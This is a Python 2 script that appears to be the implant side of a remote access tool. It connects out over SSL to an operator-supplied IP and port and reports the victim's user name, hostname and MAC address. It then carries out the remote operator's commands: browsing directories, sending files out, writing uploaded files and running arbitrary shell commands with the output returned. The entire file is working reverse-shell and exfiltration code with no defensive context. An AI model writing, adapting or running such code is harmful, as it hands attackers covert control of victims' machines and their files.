#!/usr/bin/python
from uuid import getnode as get_mac
import json, os, base64, sys, socket, ssl, getpass, subprocess
from os.path import expanduser
home = expanduser("~")
os.chdir(home)
# setup
args = json.loads(base64.b64decode(sys.argv[1]))
host, port = args['ip'], int(args['port'])
# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock = ssl.wrap_socket(s)
sock.connect((host, port))
# Send computer name
username = getpass.getuser()
sock.send(json.dumps({
	"name":username + "@" + socket.gethostname(),
	"uid": str(get_mac())
}))


def change_dir(cmd_data):
	path = cmd_data['args']
	try:
		if not path:
			os.chdir(home)
		elif os.path.exists(path) == False:
			sock.send(path + ": No such file or directory")
		elif os.path.isdir(path) == False:
			sock.send(path + ": Is a file")
		else:
			os.chdir(path)
	except Exception as e:
		sock.send(str(e))
	sock.send(cmd_data['term'])


def pwd(cmd_data):
	sock.send(os.getcwd())
	sock.send(cmd_data['term'])	


def list_dir(cmd_data):
	path = cmd_data['args']
	results = dict()
	if not path:
		path = "."
	if os.path.exists(path) == False:
		sock.send(path + ": No such file or directory")
	else:
		result = ""
		try:
			for v in os.listdir(path):
				if os.path.isdir(os.path.join(path,v)):
					results[v] = 10
				else:
					results[v] = 0
			sock.send(json.dumps(results))
		except Exception as e:
			sock.send(str(e))
	sock.send(cmd_data['term'])


def tab_complete(cmd_data):
	path = cmd_data['args']
	results = {}
	try:
		for v in os.listdir(path):
			if os.path.isdir(os.path.join(path,v)):
				results[v] = 10
			else:
				results[v] = 0
	except OSError:
		pass
	sock.send(json.dumps(results))
	sock.send(cmd_data['term'])


def send_file(cmd_data):
	path = cmd_data['args']
	if os.path.exists(path):
		if os.path.isdir(path):
			sock.send(json.dumps({"status":2}))
		else:
			f = open(path,"rb")
			data = f.read()
			sock.send(json.dumps({"status":1,"size":len(data)}))
			sock.send(cmd_data['term'])
			term = sock.recv(10)
			print "sending data"
			sock.send(data)
			sock.send(term)
			return
	else:
		sock.send(json.dumps({"status":0}))
	sock.send(cmd_data['term'])


def receive_file(cmd_data):
	term = cmd_data['term']
	extra_args = json.loads(cmd_data['args'])
	size = int(extra_args['size'])
	file_path = extra_args['path']
	file_name = extra_args['filename']
	f = open(os.path.join(file_path,file_name),'a')
	while 1:
		chunk = sock.recv(128)
		if str(chunk) == str(term):
			break
		f.write(chunk)


def run_shell_command(cmd_data):
	try:
		full_input = cmd_data['cmd'] + " " + cmd_data['args'].rstrip()
		print full_input.split()
		result = subprocess.check_output(full_input.split())
		if result:
			sock.send(result)
	except Exception as e:
		sock.send(str(e))
	sock.send(cmd_data['term'])


# SETUP
while 1:
	raw_data = sock.recv(512)
	print raw_data
	cmd_data = json.loads(raw_data)
	cmd = cmd_data['cmd']

	if cmd == "cd":
		change_dir(cmd_data)
	elif cmd == "ls":
		list_dir(cmd_data)
	elif cmd == "download":
		send_file(cmd_data)
	elif cmd == "upload":
		receive_file(cmd_data)
	elif cmd == "tab_complete":
		tab_complete(cmd_data)
	elif cmd == "pwd":
		pwd(cmd_data)
	else:
		run_shell_command(cmd_data)
